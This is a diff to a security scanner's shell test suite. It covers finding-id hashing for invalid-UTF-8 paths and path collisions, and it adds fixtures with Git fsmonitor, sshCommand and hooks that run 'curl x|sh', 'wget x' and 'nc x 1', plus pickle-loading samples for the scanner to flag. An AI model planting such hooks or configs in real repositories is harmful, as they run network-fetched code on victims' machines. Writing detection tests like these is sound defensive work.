@@ -319,9 +319,14 @@ import hashlib, json, sys
 raw = open(sys.argv[1], "rb").read()
 d = json.loads(raw.decode("utf-8"))  # strict UTF-8
 esc = lambda s: s.replace("\\", "\\\\").replace("|", "\\|").replace("\x1f", "\\u001f")
+# Since 0.5.2 an invalid byte is \xHH in the id preimage, while findings.json shows it as the text "\xHH" (escaped to
+#   \\xHH): for the paths in non_utf8_path (no literal backslash here) the \xHH of the path are bytes
+nonutf8 = {e["reason"][len("non_utf8_path:"):] for e in d["errors"] if e["reason"].startswith("non_utf8_path:")}
 def v2(f):
     canon = "\x1f".join(k + "=" + esc(f["params"][k]) for k in sorted(f["params"], key=lambda k: k.encode()))
-    return "sha256:" + hashlib.sha256("|".join(["zes-id-v2"] + [esc(x) for x in (f["module"], f["campaign"] or "", f["path"] or "", f["code"])] + [canon]).encode()).hexdigest()
+    p = esc(f["path"] or "")
+    if f["path"] in nonutf8: p = p.replace("\\\\x", "\\x")
+    return "sha256:" + hashlib.sha256("|".join(["zes-id-v2"] + [esc(x) for x in (f["module"], f["campaign"] or "")] + [p, esc(f["code"])] + [canon]).encode()).hexdigest()
 bad = [f["path"] for f in d["findings"] if f["id"] != v2(f)]
 n = len([f for f in d["findings"] if f["module"] == "§17"])
 nu = len([e for e in d["errors"] if e["module"] == "core" and e["reason"].startswith("non_utf8_path:") and "\\xff\\xfe" in e["reason"]])
@@ -333,15 +338,17 @@ PY
 else
   printf '  SKIP 不正 UTF-8 パスの JSON 検証（python3 が無い）\n'
 fi
-# Normal-form collision: a name made of the 4 characters "\xfe" and a name with the invalid byte 0xFE get the same path and id. The id is kept unique,
-# and the dropped duplicate is recorded in errors[] as duplicate_finding_id (ZET rejects input with duplicate ids)
+# Normal-form collision: a name made of the 4 characters "\xfe" and a name with the invalid byte 0xFE get the same path in
+# findings.json. Since 0.5.2 the id preimage is injective (ENC_ID), so both findings are kept with distinct ids and no
+# duplicate_finding_id (before, the second one was dropped)
 mkdir -p "$TMP/collide/a"$'\xfe' "$TMP/collide/a\xfe"
 for d in "$TMP/collide/a"$'\xfe' "$TMP/collide/a\xfe"; do cp "$FIX/mcp/.mcp.json" "$d/"; done
 run_scan "$TMP/collide" quick "$FIX/_home" | jq -e '([.findings[].id] | length) == ([.findings[].id] | unique | length)
-  and ([.errors[] | select(.module == "core" and (.reason | test("^duplicate_finding_id:sha256:[0-9a-f]{64}$")))] | length >= 1)
-  and .status == "partial"' >/dev/null \
-  && ok "正規形が衝突するパスでも id は一意、落とした重複は errors[] に duplicate_finding_id" \
-  || ng "正規形が衝突するパスで id が重複、または errors[] に記録されていません"
+  and ([.findings[] | select(.module == "§17" and (.path | endswith("/.mcp.json")))] | length) == ([.findings[] | select(.module == "§17")] | length)
+  and ([.findings[] | select(.module == "§17") | .path] | unique | length) == 1 and ([.findings[] | select(.module == "§17")] | length) >= 2
+  and ([.errors[] | select(.reason | startswith("duplicate_finding_id:"))] | length == 0)' >/dev/null \
+  && ok "正規形が衝突するパス（不正バイトと文字列 \\xfe）でも 2 件とも別 id で残り、duplicate_finding_id なし" \
+  || ng "正規形が衝突するパスの finding が落ちた、または id が重複"
 if grep -q $'\033' "$TMP/names.log"; then ng "人間向けログに ESC（端末エスケープ）がそのまま出力されています"
 else ok "人間向けログの制御文字を \\xHH で表示（端末エスケープ注入なし）"; fi
 # ZES_HOME is normalized to its real path (relative path, trailing slash, nonexistent directory)
@@ -930,6 +937,37 @@ PY
 else
   printf '  SKIP §7 の隠し文字の範囲（python3 が無い）\n'
 fi
+
+# UI 1 / UI 2 (CLI side of ui/tests/unit/r5.test.ts, same tree and rows): config.worktree, include targets, a submodule's
+#   .git/modules/<name>, gitdir: files with a commondir; §41 with Git hooks
+G5="$TMP/r5-git/g"; mkdir -p "$G5/.git/hooks" "$G5/.git/modules/sub/hooks" "$G5/sub" "$G5/wt" "$G5/gd/hooks" "$G5/shared/hooks" "$G5/out"
+printf 'x\n' >"$G5/README"; printf '# a\n' >"$G5/CLAUDE.md"
+printf '[include]\n\tpath = extra.cfg\n[include]\n\tpath = ../../outside.cfg\n' >"$G5/.git/config"
+printf '[core]\n\tfsmonitor = "curl x|sh"\n' >"$G5/.git/extra.cfg"
+printf '[core]\n\tsshCommand = ssh -oProxyCommand=x\n' >"$G5/.git/config.worktree"
+printf '#!/bin/sh\ncurl x|sh\n' >"$G5/.git/hooks/post-checkout"; printf 'ref: refs/heads/main\n' >"$G5/.git/HEAD"
+printf 'ref: refs/heads/main\n' >"$G5/.git/modules/sub/HEAD"; printf '[core]\n\tfsmonitor = "curl x|sh"\n' >"$G5/.git/modules/sub/config"
+printf '#!/bin/sh\necho hi\n' >"$G5/.git/modules/sub/hooks/pre-commit"; printf 'gitdir: ../.git/modules/sub\n' >"$G5/sub/.git"
+printf 'gitdir: ../gd\n' >"$G5/wt/.git"; printf 'ref: x\n' >"$G5/gd/HEAD"; printf '../shared\n' >"$G5/gd/commondir"; printf '#!/bin/sh\nwget x\n' >"$G5/gd/hooks/pre-push"
+printf '#!/bin/sh\nnc x 1\n' >"$G5/shared/hooks/pre-commit"; printf '[core]\n\thooksPath = x\n' >"$G5/shared/config"
+printf 'gitdir: ../../elsewhere\n' >"$G5/out/.git"
+got="$(run_scan "$G5" full "$FIX/_home" | jq -r --arg r "$G5" '[.findings[] | select(.module == "§7" or .module == "§26" or .module == "§41") | select(.path | startswith($r))
+    | "\(.level) \(.module) \(if .path == $r then "." else .path | ltrimstr($r + "/") end) \(.code)"] | sort | .[]')"
+want='CRITICAL §26 .git/extra.cfg s26.fsmonitor
+CRITICAL §26 .git/modules/sub/config s26.fsmonitor
+HIGH §26 .git/config.worktree s26.ssh_command
+HIGH §41 . s41.instructions_and_hooks
+HIGH §7 .git/hooks/post-checkout s7.git_hook_suspicious
+HIGH §7 shared/hooks/pre-commit s7.git_hook_suspicious
+MEDIUM §26 shared/config s26.hooks_path
+MEDIUM §7 .git/modules/sub/hooks/pre-commit s7.git_hook'
+[ "$got" = "$want" ] && ok "Git の config.worktree / include / submodule / gitdir: / commondir と §41 が UI の r5.test.ts と同じ" || ng "Git の設定・フックの結果が UI と異なる" "$got"
+
+# CLI-10: a scan root under node_modules/ is not skipped as a whole (the skips test the path inside the root), as the UI
+N10="$TMP/r5-nm/node_modules"; mkdir -p "$N10/pk2/node_modules/x"
+: >"$N10/pk2/model.pkl"; : >"$N10/pk2/node_modules/x/m.pkl"; printf 'import pickle\npickle.loads(b)\n' >"$N10/pk2/m.py"
+got="$(run_scan "$N10" full "$FIX/_home" | jq -r --arg r "$N10/" '[.findings[] | select(.module == "§32" or .module == "§36") | "\(.level) \(.module) \(.path | ltrimstr($r)) \(.code)"] | sort | join(",")')"
+[ "$got" = "MEDIUM §32 pk2/model.pkl s32.pickle_model,MEDIUM §36 pk2/m.py s36.pickle" ] && ok "node_modules の下の検査ルートでも §32 / §36 を検査（スキップは検査ルートからの相対パスで判定）" || ng "node_modules の下の検査ルートの結果が違う: $got"
 
 echo
 echo "結果: PASS=$PASS FAIL=$FAIL"
